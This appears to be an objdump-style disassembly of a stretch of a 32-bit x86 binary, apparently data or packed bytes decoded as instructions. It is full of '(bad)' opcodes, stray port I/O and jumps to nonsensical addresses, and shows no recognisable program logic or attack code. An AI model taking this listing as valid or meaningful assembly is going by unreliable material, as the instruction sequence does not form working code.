  4083b1:	xlat   BYTE PTR ds:[ebx]
  4083b2:	push   edi
  4083b3:	push   es
  4083b4:	retf   
  4083b5:	xor    DWORD PTR [esi+edi*8],eax
  4083b8:	push   0xbaf6ff93
  4083bd:	xor    DWORD PTR [ebp-0x1f],esi
  4083c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083c1:	jmp    0xde0b6a94
  4083c6:	lods   al,BYTE PTR ds:[esi]
  4083c7:	inc    ecx
  4083c8:	ret    
  4083c9:	xor    edi,edi
  4083cb:	in     eax,dx
  4083cc:	inc    edi
  4083cd:	xor    bh,bh
  4083cf:	push   esp
  4083d0:	mov    ds:0xcab6a639,al
  4083d5:	xor    edi,edi
  4083d7:	je     0x40843e
  4083d9:	xor    bh,bh
  4083db:	mov    dh,0xba
  4083dd:	out    0x53,eax
  4083df:	scas   al,BYTE PTR es:[edi]
  4083e0:	mov    dl,0x31
  4083e2:	call   FWORD PTR [edx+edi*2]
  4083e5:	cmp    DWORD PTR [edi-0x14ce3d52],esp
  4083eb:	in     eax,0x47
  4083ed:	pop    ebx
  4083ee:	push   0xffffffe9
  4083f0:	mov    dl,0xa7
  4083f2:	or     BYTE PTR [eax],al
  4083f4:	scas   eax,DWORD PTR es:[edi]
  4083f5:	mov    ds:0xded0ffcf,eax
  4083fa:	mov    ah,0x54
  4083fc:	rcr    dh,1
  4083fe:	(bad)  
  4083ff:	call   0x3f6fa3
  408404:	mov    al,ds:0x90ff5c89
  408409:	(bad)  
  40840b:	mov    ebp,0x2bfedf65
	...
  408438:	add    BYTE PTR [eax],al
  40843a:	ins    BYTE PTR es:[edi],dx
  40843b:	push   esp
  40843c:	and    edx,DWORD PTR [eax-0x1a]
  40843f:	pop    esp
  408440:	call   0x9d1580
  408445:	mov    DWORD PTR [edx+0x50fffe10],ebx
  40844b:	fstp   TBYTE PTR [esp+ebp*1+0xfedf20]
  408452:	retf   
  408453:	ds addr16 xcrypt-ctr (bad)
  408456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408457:	popf   
  408458:	add    bh,bh
  40845a:	mov    dl,BYTE PTR [eax]
  40845c:	(bad)  
  40845d:	inc    DWORD PTR [eax-0x2c]
  408460:	mov    ebx,0xb5ce7bd
  408465:	ror    BYTE PTR [ebx+0x32],0x8c
  408469:	xchg   ebp,eax
  40846a:	xchg   edi,ebx
  40846c:	(bad)  
  40846d:	push   DWORD PTR [ebp-0x1c]
  408470:	iret   
  408471:	inc    ebx
  408472:	lods   al,BYTE PTR ds:[esi]
  408473:	add    DWORD PTR [ebp+0xc],esi
  408476:	and    bl,dl
  408478:	das    
  408479:	push   DWORD PTR [eax-0x1c]
  40847c:	dec    edi
  40847d:	call   0x4126f9
  408482:	in     eax,dx
  408483:	cmp    cl,BYTE PTR [ebp+eax*4-0x11a79]
  40848a:	daa    
  40848b:	in     al,0x74
  40848d:	or     bh,cl
  40848f:	jno    0x408460
  408491:	call   eax
  408493:	in     al,0x74
  408495:	cld    
  408496:	ds leave 
  408498:	adc    BYTE PTR [eax],cl
  40849a:	push   esi
  40849b:	call   0x41845a
	...
  4084c8:	pop    ecx
  4084c9:	jns    0x4084fa
  4084cb:	leave  
  4084cc:	jl     0x408504
  4084ce:	add    edx,DWORD PTR [ebp-0x4b]
  4084d1:	(bad)  
  4084d2:	test   ah,al
  4084d4:	push   esi
  4084d5:	test   eax,0xfecbff8b
  4084da:	xchg   BYTE PTR [eax+0x31],dl
  4084dd:	pop    es
  4084de:	idiv   esi
  4084e0:	jae    0x4084ba
  4084e2:	cmp    eax,DWORD PTR [ecx+0x3e]
  4084e5:	call   0xbffe:0x423ebe1d
  4084ec:	inc    ecx
  4084ed:	mov    bh,0xa3
  4084ef:	add    BYTE PTR [esi],bh
  4084f1:	inc    edx
  4084f2:	ret    0x645
  4084f5:	inc    edx
  4084f6:	add    eax,DWORD PTR [eax]
  4084f8:	add    DWORD PTR ds:[ecx-0xc],0x338f1
  408500:	push   esp
  408501:	inc    edx
  408502:	sbb    eax,0x98b6b300
  408507:	neg    ecx
  408509:	pop    eax
  40850a:	xor    al,0x6a
  40850c:	ds mov edi,0xb76ef441
  408512:	xor    esp,0x508a40c9
  408518:	mov    ecx,0x2bff8c8e
  40851d:	push   cs
  40851e:	fwait
  40851f:	push   esp
  408520:	call   0x7e4b8866
  408525:	test   DWORD PTR [ecx],eax
  408527:	jmp    0x43c70f
	...
  408554:	add    BYTE PTR [eax],al
  408556:	mov    ebp,0x89f797ae
  40855b:	call   0xc570f963
  408560:	dec    eax
  408561:	in     al,dx
  408562:	jno    0x4085be
  408564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408565:	mov    bh,BYTE PTR [ecx]
  408567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408568:	in     al,0x8a
  40856a:	add    esi,DWORD PTR [ebx]
  40856c:	adc    BYTE PTR [ecx-0x2a],0x6d
  408570:	cmp    BYTE PTR [ebp+0x3e],al
  408573:	fisubr WORD PTR [ebx-0x71]
  408576:	dec    ecx
  408577:	das    
  408578:	jle    0x4085ad
  40857a:	push   esi
  40857b:	cdq    
  40857c:	aaa    
  40857d:	add    edi,DWORD PTR [esi]
  40857f:	fs test eax,0x6be0af0f
  408585:	fwait
  408586:	sub    DWORD PTR [edi],ebp
  408588:	pop    esi
  408589:	xor    edi,DWORD PTR [ebx+0x21925cd8]
  40858f:	das    
  408590:	mov    ecx,0x465f938a
  408595:	shl    bl,1
  408597:	mov    ds:0x191603a8,eax
  40859c:	sbb    eax,0x2963018a
  4085a1:	jg     0xe9d3f18b
  4085a7:	cs push ds
  4085a9:	sbb    edi,DWORD PTR [edi]
  4085ab:	pop    ebx
  4085ac:	push   es
  4085ad:	dec    ecx
  4085ae:	loope  0x408558
  4085b0:	loope  0x40854d
  4085b2:	sbb    DWORD PTR ds:0xf0bd8a06,0x920c
	...
  4085e4:	leave  
  4085e5:	cs call 0xea01b7fb
  4085eb:	mov    dh,BYTE PTR [ebx]
  4085ed:	arpl   cx,dx
  4085ef:	rol    BYTE PTR [ebx+0x349dde2e],1
  4085f5:	shr    eax,0x88
  4085f8:	sub    esp,DWORD PTR [ebx-0x3f]
  4085fb:	fmul   QWORD PTR [ebx-0x347639d2]
  408601:	inc    ebx
  408602:	mov    dh,0x89
  408604:	mov    DWORD PTR [esi],ebp
  408606:	add    BYTE PTR [edx+ebp*4+0x26],bh
  40860a:	jmp    FWORD PTR [esi-0x6ef75739]
  408610:	xor    BYTE PTR ds:0xe8b79eff,bl
  408616:	out    dx,eax
  408617:	sahf   
  408618:	mov    bh,0x2e
  40861a:	call   0xff6f1350
  40861f:	xchg   BYTE PTR [ecx],dl
  408621:	xor    ebp,ecx
  408623:	shl    DWORD PTR [esi+0x3176ff2e],1
  408629:	das    
  40862a:	call   0x9c0724
  40862f:	xor    al,bh
  408631:	bound  eax,QWORD PTR [eax]
  408633:	mov    ah,0xaa
  408635:	aas    
  408636:	sub    DWORD PTR ds:0x4eff25de,0x99fc9891
  408640:	(bad)  
  408641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408642:	or     al,0x3e
  408644:	stc    
  408645:	inc    DWORD PTR [edi-0x58]
	...
  408670:	add    BYTE PTR [eax],al
  408672:	cmp    eax,0x426c5b43
  408677:	pop    ebx
  408678:	or     ebp,DWORD PTR [ecx]
  40867a:	not    esi
  40867c:	push   edx
  40867d:	call   0xad07e1bf
  408682:	mov    ch,0x5a
  408684:	add    cl,ch
  408686:	cmp    eax,0xc6fd4516
  40868b:	push   ebp
  40868c:	add    cl,ch
  40868e:	sub    ebx,DWORD PTR [ebx+0x6a]
  408691:	jmp    0xe9aae1b9
  408696:	xor    BYTE PTR [eax-0x27d6c60c],bl
  40869c:	repz (bad) 
  40869e:	mov    dh,0x2d
  4086a0:	push   eax
  4086a1:	(bad)  
  4086a2:	xor    BYTE PTR [ebx],dh
  4086a4:	call   DWORD PTR [esi+eax*8+0x42]
  4086a8:	sub    eax,0x59ba00
  4086ad:	or     edx,edi
  4086af:	pop    ebp
  4086b0:	add    eax,0x5861e9
  4086b5:	add    bh,bh
  4086b7:	lods   al,BYTE PTR ds:[esi]
  4086b8:	dec    eax
  4086b9:	inc    ecx
  4086ba:	addr16 loop 0x408731
  4086bd:	or     al,0xcf
  4086bf:	arpl   sp,dx
  4086c1:	dec    eax
  4086c3:	imul   ecx,DWORD PTR [ebx-0xb530530],0x4fe2b8f7
  4086cd:	push   edx
  4086ce:	scas   eax,DWORD PTR es:[edi]
  4086cf:	push   ebx
  4086d0:	aam    0xff
  4086d2:	enter  0x85b0,0xf0
	...
  4086fe:	add    BYTE PTR [eax],al
  408700:	mov    al,0xe3
  408702:	(bad)  
  408703:	call   0x3f6f6b
  408708:	or     eax,0xe6266859
  40870d:	cdq    
  40870e:	add    bh,bh
  408710:	mov    dl,0xc8
  408712:	idiv   bh
  408714:	js     0x4086f9
  408716:	xor    al,0xae
  408718:	iret   
  408719:	cdq    
  40871a:	add    al,ch
  40871c:	push   ebx
  40871d:	out    0xfe,eax
  40871f:	call   FWORD PTR [esi-0x53]
  408722:	in     al,0xf7
  408724:	sbb    bl,ah
  408726:	imul   eax,DWORD PTR [eax],0x415013cf
  40872c:	xlat   BYTE PTR ds:[ebx]
  40872d:	jecxz  0x4086e3
  40872f:	lock xor bl,ah
  408732:	(bad)  
  408733:	call   DWORD PTR [edx-0x28beb76e]
  408739:	shl    BYTE PTR [ebp-0x772b372d],1
  40873f:	test   DWORD PTR [ebx+0xdfffedc],edi
  408745:	push   edi
  408746:	push   0x966638
  40874b:	(bad)  
  40874c:	ds iret 
  40874e:	xchg   ebx,eax
  40874f:	neg    DWORD PTR [ecx-0x1fca78e3]
  408755:	push   0x45
  408757:	add    BYTE PTR [esi-0x7e004c56],dl
  40875d:	mov    ebx,0xfd71e881
  408762:	xchg   BYTE PTR [ebx+0x0],al
	...
  40878c:	add    BYTE PTR [eax],al
  40878e:	mov    bl,0xde
  408790:	mov    ?,edi
  408792:	imul   eax,DWORD PTR [edx+0xf],0x9887bd49
  408799:	neg    DWORD PTR [ecx-0x23]
  40879c:	add    esi,DWORD PTR [esi+edi*8-0x40]
  4087a0:	dec    ecx
  4087a1:	call   0xc834f7
  4087a6:	retf   0x1aec
  4087a9:	add    BYTE PTR [esi],bh
  4087ab:	lods   eax,DWORD PTR ds:[esi]
  4087ac:	inc    esi
  4087ad:	jmp    FWORD PTR [ebx-0x50c64d6]
  4087b3:	mov    WORD PTR [edi-0x706a1401],es
  4087b9:	call   FWORD PTR [ecx]
  4087bb:	popf   
  4087bc:	adc    DWORD PTR [eax],ecx
  4087be:	es std 
  4087c0:	mov    bh,0xff
  4087c2:	or     DWORD PTR [ebp+0x51],ebp
  4087c5:	call   0xffc7ecd3
  4087ca:	jae    0x408806
  4087cc:	fwait
  4087cd:	cmp    DWORD PTR [ebx],eax
  4087cf:	jne    0x408758
  4087d1:	push   DWORD PTR [ebx-0x1e0070ab]
  4087d7:	inc    esp
  4087d8:	adc    DWORD PTR [eax],ecx
  4087da:	out    0x18,al
  4087dc:	mov    eax,0x5154d1ff
  4087e1:	in     al,0xd1
  4087e3:	sub    al,0x86
  4087e5:	call   0xffc7da1d
  4087ea:	mov    ecx,0xb1f79866
  4087ef:	pop    edx
  4087f0:	out    0x9b,al
	...
  40881a:	add    BYTE PTR [eax],al
  40881c:	cmp    al,0xb
  40881e:	fiadd  WORD PTR [esi-0x713f1a5f]
  408824:	cdq    
  408825:	sub    eax,ecx
  408827:	mov    es,WORD PTR [ecx-0x2c7939d5]
  40882d:	sub    dh,BYTE PTR [esi+0x3c2b8186]
  408833:	cld    
  408834:	popa   
  408835:	cmc    
  408836:	scas   al,BYTE PTR es:[edi]
  408837:	xchg   BYTE PTR [ecx+0x2b],dh
  40883a:	pop    esp
  40883b:	xchg   ebx,eax
  40883c:	jno    0x408869
  40883e:	sahf   
  40883f:	fwait
  408840:	sbb    BYTE PTR [ebx],0x96
  408843:	xchg   BYTE PTR [ecx-0x6b],bl
  408846:	xchg   ecx,eax
  408847:	pushf  
  408848:	xchg   edx,eax
  408849:	sub    al,0x86
  40884b:	xchg   BYTE PTR [ecx-0x5b],cl
  40884e:	jge    0x4087eb
  408850:	inc    esp
  408851:	out    dx,eax
  408852:	call   0xe15e8f5a
  408857:	add    ecx,DWORD PTR [ebx+0x28254d6]
  40885d:	sub    bl,dl
  40885f:	add    edx,DWORD PTR [esp+ebx*2+0x33461056]
  408866:	pop    ecx
  408867:	mov    bh,0x11
  408869:	sub    esi,DWORD PTR [eax+0x40]
  40886c:	or     dh,BYTE PTR [esi+edi*8+0x365b7f33]
  408873:	adc    BYTE PTR [esi+0x33],al
  408876:	lds    eax,FWORD PTR [ebp+0x25912af1]
  40887c:	mov    ds,WORD PTR [ecx+ebp*8+0x86]
	...
  4088a7:	add    BYTE PTR [eax],al
  4088a9:	add    BYTE PTR [ebx+0x53],ch
  4088ac:	add    DWORD PTR [esi],ebp
  4088ae:	fsubr  DWORD PTR [edx]
  4088b0:	push   cs
  4088b1:	sbb    edx,DWORD PTR [eax-0x75]
  4088b4:	test   al,0x3
  4088b6:	leave  
  4088b7:	mov    al,0xf1
  4088b9:	fwait
  4088ba:	je     0x4088e5
  4088bc:	add    dh,dh
  4088be:	ret    
  4088bf:	mov    bl,0xa5
  4088c1:	cdq    
  4088c2:	cli    
  4088c3:	pop    edx
  4088c4:	call   FWORD PTR [edx+ebp*4+0x42]
  4088c8:	das    
  4088c9:	fdivr  QWORD PTR [ebx+0x52a4682a]
  4088cf:	pushf  
  4088d0:	add    dh,cl
  4088d2:	inc    ecx
  4088d3:	push   ebx
  4088d4:	call   0xff6b49e4
  4088d9:	push   ecx
  4088da:	mov    al,0x8b
  4088dc:	inc    ecx
  4088dd:	jmp    0xc14939a4
  4088e2:	popa   
  4088e3:	daa    
  4088e4:	jmp    DWORD PTR [esi-0x61034f3d]
  4088ea:	xor    DWORD PTR [ebx-0x18],edx
  4088ed:	mov    bl,0x96
  4088ef:	sub    bh,bh
  4088f1:	mov    al,ds:0x1c005f7c
  4088f6:	(bad)  
  4088f7:	ss push 0xbe3a3de9
  4088fd:	jbe    0x408948
  4088ff:	push   edi
  408900:	push   esp
  408902:	xor    eax,0xc35c5242
  408907:	sub    ecx,ecx
  408909:	sub    esp,DWORD PTR [edx]
  40890b:	sub    dl,BYTE PTR [edx+eiz*2+0x0]
	...
  408937:	add    BYTE PTR [esi+0x3ddd7cdd],dh
  40893d:	pop    edx
  40893e:	test   BYTE PTR [ebx],cl
  408940:	cmp    eax,0x313e005b
  408945:	push   edi
  408946:	call   0xff6a3100
  40894b:	loop   0x40894a
  40894d:	scas   eax,DWORD PTR es:[edi]
  40894e:	adc    BYTE PTR [ecx-0x16be6c99],dl
  408954:	mov    edx,0xd0010caf
  408959:	or     al,0xff
  40895b:	push   cs
  40895c:	push   ebp
  40895d:	mov    al,ds:0x5dad000c
  408962:	push   0x9ca662
  408967:	push   0x416cc2
  40896c:	mov    al,ds:0x5648ad18
  408971:	pop    edi
  408972:	call   0xff1f6e90
  408977:	or     esp,edi
  408979:	pop    ecx
  40897a:	push   ds
  40897b:	push   eax
  40897c:	push   edi
  40897d:	loopne 0x4089f3
  40897f:	or     al,0x6f
  408981:	stos   DWORD PTR es:[edi],eax
  408982:	sar    bh,cl
  408984:	shr    BYTE PTR [ebp+0x50],0xff
  408988:	cmp    ah,BYTE PTR [edi]
  40898a:	out    0x91,eax
  40898c:	mov    al,ds:0xbbe8fede
  408991:	out    dx,eax
  408992:	(bad)  
  408993:	dec    edi
  408995:	dec    ch
  408997:	push   DWORD PTR [eax+0x680043]
	...
  4089c5:	add    BYTE PTR [ebp+0x6e],al
  4089c8:	inc    ecx
  4089c9:	add    BYTE PTR [edi],ch
  4089cb:	push   edx
  4089cc:	push   ecx
  4089cd:	inc    ecx
  4089ce:	push   edi
  4089cf:	inc    ebp
  4089d0:	add    al,BYTE PTR [eax]
  4089d2:	daa    
  4089d3:	fucom  st(7)
  4089d5:	loope  0x4089ad
  4089d7:	(bad)  
  4089d9:	or     edx,DWORD PTR [edi+0x58]
  4089dc:	push   ds
  4089dd:	push   eax
  4089de:	out    0xdf,eax
  4089e0:	je     0x4089ee
  4089e2:	jg     0x408a56
  4089e4:	sar    bh,cl
  4089e6:	sub    BYTE PTR [eax+edx*2-0x1],0xca
  4089eb:	and    al,0xe7
  4089ed:	pop    ecx
  4089ee:	inc    eax
  4089ef:	(bad)  
  4089f1:	call   0x3f78b9
  4089f6:	jg     0x40897f
  4089f8:	into   
  4089f9:	jmp    DWORD PTR [eax]
  4089fb:	inc    edx
  4089fc:	add    BYTE PTR [eax-0x4b],ch
  4089ff:	ins    DWORD PTR es:[edi],dx
  408a00:	inc    ecx
  408a01:	add    BYTE PTR [esi],bh
  408a03:	fidiv  DWORD PTR [edx+0x51]
  408a06:	jg     0x408a3a
  408a08:	test   BYTE PTR ds:0x41ea98,dh
  408a0e:	(bad)  
  408a0f:	mov    dh,BYTE PTR [edx-0x3cc24601]
  408a15:	je     0x408a67
  408a17:	ret    0xff32
  408a1a:	xor    ebp,DWORD PTR [esi]
  408a1c:	imul   esp,DWORD PTR [ecx],0xffffff8c
  408a1f:	or     DWORD PTR [ebx-0x6ef11b0],eax
  408a25:	pop    es
  408a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a27:	push   edx
  408a28:	cmp    edi,0x0
	...
  408a53:	add    BYTE PTR [ecx-0x7e3208f6],cl
  408a59:	jmp    0xf1c8f8c9
  408a5e:	sub    BYTE PTR [edx+0x3e],0x9a
  408a62:	out    0x50,al
  408a64:	push   DWORD PTR [ecx]
  408a66:	jmp    0x4089f7
  408a68:	(bad)  
  408a6a:	add    al,0x68
  408a6c:	cmp    al,0x32
  408a6e:	add    eax,DWORD PTR [eax-0xaabd9a]
  408a74:	dec    ecx
  408a75:	sub    eax,0x42207443
  408a7a:	aam    0xfe
  408a7c:	mov    bl,0x3e
  408a7e:	imul   ebp,ecx,0xf
  408a81:	mov    ecx,0xc18e5083
  408a86:	stc    
  408a87:	pop    es
  408a88:	push   ss
  408a89:	mov    al,BYTE PTR [edx+0x3f9a19ff]
  408a8f:	into   
  408a90:	adc    DWORD PTR [ecx-0x5f07c994],ebx
  408a96:	sub    DWORD PTR [eax+0x7c],0xffffffc3
  408a9a:	ret    
  408a9b:	(bad)  
  408a9c:	clc    
  408a9d:	out    0xe,al
  408a9f:	call   0xffc3cdaa
  408aa4:	mov    ds,WORD PTR [ebx-0x47]
  408aa7:	sub    BYTE PTR [ebx+0x53],0x11
  408aab:	dec    ebx
  408aac:	fsub   DWORD PTR [edi]
  408aae:	push   ss
  408aaf:	ins    BYTE PTR es:[edi],dx
  408ab0:	xor    al,0x19
  408ab2:	push   cs
  408ab3:	or     ecx,0xffffffad
  408ab6:	cmc    
  408ab7:	imul   eax,DWORD PTR [eax],0x0
	...
  408ae2:	sub    al,0x19
  408ae4:	inc    BYTE PTR [edx+0x3e11c87]
  408aea:	or     edx,esp
  408aec:	cld    
  408aed:	xchg   BYTE PTR [edx+0x1404532e],al
  408af3:	pop    ebp
  408af4:	fdivp  st(0),st
  408af6:	inc    ecx
  408af7:	xor    ebx,DWORD PTR ds:0x6027914f
  408afd:	enter  0xb285,0xec
  408b01:	add    al,0x3e
  408b03:	pop    ebx
  408b04:	ror    DWORD PTR [ecx],1
  408b06:	mov    BYTE PTR [edi],ah
  408b08:	mov    dh,0x8c
  408b0a:	sti    
  408b0b:	and    al,BYTE PTR [ecx+0x8]
  408b0e:	aas    
  408b0f:	pop    ebx
  408b10:	jmp    0x91637697
  408b15:	test   BYTE PTR [edi+0x7e0ee95a],dl
  408b1b:	scas   al,BYTE PTR es:[edi]
  408b1c:	cmc    
  408b1d:	inc    eax
  408b1e:	inc    edx
  408b1f:	pop    edx
  408b20:	jmp    0x7e965428
  408b25:	clc    
  408b26:	xor    DWORD PTR [edi],esp
  408b28:	cld    
  408b29:	or     esp,DWORD PTR [esi]
  408b2b:	aam    0x6e
  408b2d:	sub    BYTE PTR [ecx],0x33
  408b30:	icebp  
  408b31:	sub    BYTE PTR [ebx+0xbc25123],0x27
  408b38:	push   esi
  408b39:	in     eax,dx
  408b3a:	pop    ecx
  408b3b:	xor    edi,ecx
  408b3d:	push   ebp
  408b3e:	or     DWORD PTR [edi],esp
  408b40:	cdq    
  408b41:	or     BYTE PTR [ebx+0xf15153],0x0
	...
  408b70:	sti    
  408b71:	add    BYTE PTR es:[esi],dh
  408b74:	jecxz  0x408bba
  408b76:	call   0xff671f64
  408b7b:	bnd jge 0x408b2d
  408b7e:	adc    al,0x91
  408b80:	out    dx,eax
  408b81:	mov    eax,DWORD PTR [ecx-0x17]
  408b84:	in     eax,dx
  408b85:	mov    WORD PTR ds:[eax],?
  408b88:	mov    esp,0xc6065026
  408b8d:	pop    esi
  408b8e:	call   0xff674b41
  408b93:	sbb    DWORD PTR [eax+0x33],0xffffffe1
  408b97:	sbb    BYTE PTR [esi+eiz*1+0x4aa6a90b],bh
  408b9e:	push   0x9b6d2f
  408ba3:	cmp    DWORD PTR [edx],esp
  408ba5:	mov    eax,0x8bbfced1
  408baa:	(bad)  
  408bab:	cmp    al,0x32
  408bad:	xor    esi,DWORD PTR [eax]
  408baf:	mov    edi,0xd56a26bf
  408bb4:	in     eax,0x18
  408bb6:	shr    DWORD PTR [esi+0x1dc052bf],1
  408bbc:	inc    esi
  408bbd:	mov    bl,0x4e
  408bbf:	cmp    BYTE PTR [ebp+0x26],bh
  408bc2:	dec    edi
  408bc3:	sub    DWORD PTR [ebx+ecx*1-0x1],0x7525728e
  408bcb:	icebp  
  408bcc:	aad    0x4b
  408bce:	(bad)  
  408bcf:	jle    0x408b90
  408bd1:	mov    al,0x0
  408bd3:	add    DWORD PTR [eax],eax
	...
  408bfd:	add    BYTE PTR [edi],dl
  408bff:	mov    eax,DWORD PTR [ecx-0x17]
  408c02:	adc    eax,0x3da851b7
  408c07:	es xor eax,0x9b0a8f
  408c0d:	inc    ecx
  408c0e:	jmp    0x408c25
  408c10:	dec    DWORD PTR [esi-0xe]
  408c13:	and    al,0x75
  408c15:	add    BYTE PTR [edi],cl
  408c17:	mov    dl,0xf1
  408c19:	std    
  408c1a:	cmp    ah,bl
  408c1c:	imul   eax,DWORD PTR [eax],0x41503fff
  408c22:	xlat   BYTE PTR ds:[ebx]
  408c23:	xor    DWORD PTR [ecx+edx*2-0x6a],ebp
  408c27:	pop    ecx
  408c28:	push   DWORD PTR ds:0x401789
  408c2e:	aas    
  408c2f:	jo     0x408c01
  408c31:	(bad)  
  408c32:	cmp    BYTE PTR [eax-0x40],bl
  408c35:	je     0x408c18
  408c37:	rol    BYTE PTR [esp+esi*8-0x48],1
  408c3b:	sub    al,0xf3
  408c3d:	push   DWORD PTR [edx]
  408c3f:	push   edx
  408c40:	call   0xff1b26f6
  408c45:	inc    DWORD PTR [edx]
  408c47:	mov    ds:0xdaea01e8,eax
  408c4c:	(bad)  
  408c4d:	push   0xffffffa7
  408c4f:	xor    DWORD PTR [esi+0x51],edx
  408c52:	push   esi
  408c53:	pop    edi
  408c54:	push   0xff1a2690
  408c59:	(bad)  
  408c5a:	jb     0x408c47
  408c5c:	inc    edi
  408c5d:	inc    ecx
  408c5e:	addr16 mov cl,0x2
  408c61:	rol    BYTE PTR [eax],1
	...
  408c8b:	add    BYTE PTR [eax+0x42ff4fda],bl
  408c91:	push   edi
  408c92:	call   0xff1b4737
  408c97:	push   0x67
  408c99:	xor    DWORD PTR [ecx+0x51],esp
  408c9c:	push   ss
  408c9d:	pop    edi
  408c9e:	push   0xff1a2690
  408ca3:	(bad)  
  408ca4:	repnz jmp 0xcfe2:0xb1274147
  408cac:	cwde   
  408cad:	fisttp DWORD PTR [edx]
  408caf:	rol    BYTE PTR [ebx],0x43
  408cb2:	mov    DWORD PTR [ebp+0x73],eax
  408cb5:	(bad)  [esp+esi*8+0x3e]
  408cb9:	(bad)  
  408cba:	test   BYTE PTR [edi],0x16
  408cbd:	adc    edi,DWORD PTR [esi-0x1]
  408cc0:	add    DWORD PTR [esi-0x5d190c0a],ebx
  408cc6:	dec    edi
  408cc7:	push   ecx
  408cc9:	sbb    BYTE PTR [ebx],al
  408ccb:	push   0xffc1c391
  408cd0:	pop    ecx
  408cd1:	iret   
  408cd2:	rol    DWORD PTR [eax+0x3e],1
  408cd5:	retf   0x4
  408cd8:	ds mov dl,0x6b
  408cdb:	mov    dl,0xf9
  408cdd:	push   ebp
  408cde:	adc    BYTE PTR [eax-0x3f],0xa7
  408ce2:	or     ebp,eax
  408ce4:	push   cs
  408ce5:	daa    
  408ce6:	jg     0x408ce7
  408ce8:	and    al,0x32
  408cea:	jmp    0x408d4d
  408cec:	psllq  mm0,QWORD PTR [edx]
  408cef:	push   0x0
	...
  408d18:	add    BYTE PTR [eax],al
  408d1a:	adc    esp,DWORD PTR [ebx-0x3b]
  408d1d:	jmp    DWORD PTR [ecx]
  408d1f:	xor    BYTE PTR [ebx],al
  408d21:	add    BYTE PTR [esi-0x76306ce6],bh
  408d27:	adc    eax,0x40ac00b
  408d2c:	mov    WORD PTR [ebp+0x72],es
  408d2f:	in     eax,0xf8
  408d31:	repz jno 0x408d9b
  408d34:	or     al,0xe8
  408d36:	dec    edi
  408d37:	idiv   DWORD PTR [esi-0x1]
  408d3a:	popa   
  408d3b:	inc    edi
  408d3c:	js     0x408d26
  408d3e:	fcomip st,st(5)
  408d40:	jle    0x408d41
  408d42:	in     al,0x31
  408d44:	jmp    0x408d9c
  408d46:	out    dx,eax
  408d47:	jb     0x408d4d
  408d49:	push   0xffc543ae
  408d4e:	mov    eax,ds:0xbe000330
  408d53:	(bad)  
  408d55:	into   
  408d56:	sub    DWORD PTR [ebp+0x5babfed4],esi
  408d5c:	icebp  
  408d5d:	imul   edi,DWORD PTR [edi],0x26
  408d60:	pop    esi
  408d61:	jg     0x408d07
  408d63:	pop    ebx
  408d64:	shl    ecx,0x6e
  408d67:	call   0x3a8:0x89b1ebe9
  408d6e:	pop    cx
  408d70:	jmp    0xad734b78
  408d75:	dec    esi
  408d76:	jmp    0x6a846f9e
  408d7b:	dec    ebp
  408d7c:	jo     0x408d47
	...
  408da6:	add    BYTE PTR [eax],al
  408da8:	int    0x23
  408daa:	xchg   esp,eax
  408dab:	ja     0x408d7e
  408dad:	lods   eax,DWORD PTR ds:[esi]
  408dae:	loope  0x408e1b
  408db0:	cld    
  408db1:	es push cs
  408db3:	jg     0x408d76
  408db5:	lods   eax,DWORD PTR ds:[esi]
  408db6:	std    
  408db7:	imul   ecx,DWORD PTR [edi+edx*1-0x2],0x7e
  408dbc:	mov    cl,0xad
  408dbe:	cmc    
  408dbf:	jle    0x408df4
  408dc1:	push   ebx
  408dc2:	add    DWORD PTR [ecx+0x4ce62377],ecx
  408dc8:	jl     0x408e28
  408dca:	jmp    0x417752a7
  408dcf:	add    al,0x3e
  408dd1:	xor    al,0x8f
  408dd3:	jle    0x408de0
  408dd5:	push   edi
  408dd6:	xabort 0x41
  408dd9:	xor    edi,DWORD PTR [esp+esi*2+0x41a02371]
  408de0:	ss pop ebx
  408de2:	adc    al,0x8b
  408de4:	push   edx
  408de5:	fldcw  WORD PTR [edi+esi*4+0x469e2358]
  408dec:	mov    ebx,0x497e96e2
  408df1:	pop    edx
  408df2:	jmp    0x2c10cbfa
  408df7:	adc    BYTE PTR [ebp+0x1b],al
  408dfa:	cmc    
  408dfb:	or     BYTE PTR [esi+0x26e90063],bh
  408e01:	pop    eax
  408e02:	jmp    0x9bc917
  408e07:	pushw  ss
  408e09:	push   edi
  408e0a:	call   0x408f08
	...
  408e33:	add    BYTE PTR [eax],al
  408e35:	add    BYTE PTR [eax+0x22],ch
  408e38:	jmp    edx
  408e3a:	jge    0x408de4
  408e3c:	xadd   DWORD PTR [ebx-0x6e],esi
  408e40:	inc    ecx
  408e41:	jmp    0x514d36be
  408e46:	add    edx,DWORD PTR [edx]
  408e48:	push   DWORD PTR [esi]
  408e4a:	push   esp
  408e4b:	push   eax
  408e4c:	push   0x9bf01a
  408e51:	es (bad) 
  408e53:	push   esi
  408e54:	call   0xff630f37
  408e59:	pusha  
  408e5a:	mov    dh,0xe3
  408e5c:	std    
  408e5d:	push   cs
  408e5e:	inc    eax
  408e5f:	mov    bl,0x3e
  408e61:	call   0x64cde9a3
  408e66:	jmp    DWORD PTR [eax]
  408e68:	push   esi
  408e6a:	mov    WORD PTR [edx],?
  408e6c:	mov    bh,0x22
  408e6e:	and    BYTE PTR [edx],ah
  408e70:	lea    ebp,[esp+edi*8+0x20]
  408e74:	(bad)  
  408e75:	fisubr WORD PTR [edx+0x21]
  408e78:	mov    ch,0x91
  408e7a:	or     BYTE PTR [edx],ah
  408e7c:	inc    ecx
  408e7e:	adc    eax,0xc4e8ffe9
  408e83:	fdivr  DWORD PTR [ebx+0x4021f3bf]
  408e89:	out    0xc1,al
  408e8b:	es add cl,ch
  408e8e:	cmp    eax,0xd8ab94d0
  408e93:	and    edi,edi
  408e95:	xchg   esi,eax
  408e96:	cmp    al,0x4b
  408e98:	add    cl,ch
	...
  408ec2:	add    BYTE PTR [eax],al
  408ec4:	cmp    eax,0x7c5c65a7
  408ec9:	jbe    0x408f1b
  408ecb:	add    BYTE PTR [edi-0x6a],cl
  408ece:	dec    edi
  408ecf:	inc    ecx
  408ed0:	daa    
  408ed1:	mov    dh,0xc6
  408ed3:	mov    dh,0x17
  408ed5:	pop    esi
  408ed6:	or     eax,eax
  408ed8:	sub    bl,BYTE PTR [ecx-0x17]
  408edb:	mov    cl,0x27
  408edd:	pop    esi
